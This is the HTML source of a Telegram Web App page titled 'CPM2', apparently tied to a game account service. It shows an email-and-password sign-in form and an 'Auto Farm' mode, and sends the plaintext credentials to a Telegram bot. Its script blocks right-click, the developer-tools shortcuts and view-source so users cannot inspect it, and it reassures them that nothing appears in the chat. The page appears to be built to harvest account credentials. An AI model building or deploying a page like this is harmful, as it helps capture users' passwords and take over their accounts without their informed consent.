<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>CPM2</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-user-select:none;user-select:none;}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  background:var(--tg-theme-bg-color,#1c2733);
  color:var(--tg-theme-text-color,#f1f1f1);
  min-height:100vh;display:flex;align-items:center;justify-content:center;
  padding:28px 20px;
}
.card{width:100%;max-width:400px;}
h1{font-size:22px;font-weight:700;margin-bottom:6px;}
.sub{font-size:13px;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:28px;line-height:1.4;}
.field{margin-bottom:16px;}
label{display:block;font-size:11px;font-weight:700;letter-spacing:.7px;
  text-transform:uppercase;color:var(--tg-theme-hint-color,#8899a6);margin-bottom:7px;}
input{
  width:100%;padding:14px 16px;border-radius:12px;
  border:1.5px solid rgba(255,255,255,.07);
  background:var(--tg-theme-secondary-bg-color,#232f3e);
  color:var(--tg-theme-text-color,#fff);
  font-size:16px;outline:none;-webkit-appearance:none;
  transition:border-color .15s;
  -webkit-user-select:text;user-select:text;
}
input:focus{border-color:var(--tg-theme-button-color,#2481cc);}
.err{min-height:20px;color:#ff6b6b;font-size:13px;margin-bottom:14px;}
button{
  width:100%;padding:15px;border-radius:12px;border:none;
  background:var(--tg-theme-button-color,#2481cc);
  color:var(--tg-theme-button-text-color,#fff);
  font-size:16px;font-weight:700;cursor:pointer;
  -webkit-tap-highlight-color:transparent;
}
button:disabled{opacity:.5;cursor:default;}
button:not(:disabled):active{opacity:.8;}
#block{text-align:center;padding:40px 20px;display:none;}
#block .ico{font-size:56px;margin-bottom:14px;}
#block h2{font-size:20px;margin-bottom:10px;}
#block p{color:var(--tg-theme-hint-color,#8899a6);line-height:1.6;font-size:14px;}
#form{display:none;}
</style>
</head>
<body>
<div class="card">
  <div id="block">
    <div class="ico">⛔</div>
    <h2>Доступ запрещён</h2>
    <p>Работает только внутри Telegram<br>через кнопку бота.</p>
  </div>
  <div id="form">
    <h1 id="title">🔐 Sign In</h1>
    <div class="sub">Данные передаются боту напрямую — в чате ничего не появляется</div>
    <div class="field">
      <label>Email</label>
      <input type="email" id="email" placeholder="account@gmail.com"
             autocomplete="email" inputmode="email" spellcheck="false">
    </div>
    <div class="field">
      <label>Password</label>
      <input type="password" id="password" placeholder="••••••"
             autocomplete="current-password">
    </div>
    <div class="err" id="err"></div>
    <button id="btn">Войти</button>
  </div>
</div>

<script>
(function(){
  document.addEventListener('contextmenu',function(e){e.preventDefault();});
  document.addEventListener('keydown',function(e){
    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].indexOf(e.key.toUpperCase())>=0)||
       (e.ctrlKey&&['U','S'].indexOf(e.key.toUpperCase())>=0)){e.preventDefault();return false;}
  });

  var tg       = window.Telegram && window.Telegram.WebApp;
  var hasProxy = typeof window.TelegramWebviewProxy !== 'undefined';
  var initData = tg ? (tg.initData || '') : '';
  var mode     = new URLSearchParams(window.location.search).get('mode') || 'login';

  var inTelegram = (tg && initData.length > 0) || hasProxy;

  if(!inTelegram){
    document.getElementById('block').style.display = 'block';
    return;
  }

  if(tg){ tg.ready(); tg.expand(); tg.MainButton.hide(); }

  if(mode==='af'){
    document.getElementById('title').textContent = '🤖 Auto Farm';
    document.querySelector('.sub').textContent = 'Добавить аккаунт в авто-фарм';
    document.getElementById('btn').textContent = 'Добавить';
  }
  document.getElementById('form').style.display = 'block';

  document.getElementById('btn').addEventListener('click', submit);
  document.addEventListener('keydown',function(e){ if(e.key==='Enter') submit(); });

  function submit(){
    var email = document.getElementById('email').value.trim().toLowerCase();
    var pw    = document.getElementById('password').value;
    var errEl = document.getElementById('err');
    var btn   = document.getElementById('btn');
    errEl.textContent = '';
    if(!email || email.indexOf('@')<1 || email.length<5){
      errEl.textContent='❌ Введите корректный email';
      document.getElementById('email').focus(); return;
    }
    if(!pw || pw.length<4){
      errEl.textContent='❌ Введите пароль';
      document.getElementById('password').focus(); return;
    }
    btn.disabled=true; btn.textContent='⏳ Отправка…';
    tg.sendData(JSON.stringify({mode:mode,email:email,password:pw}));
  }
}());
</script>
</body>
</html>
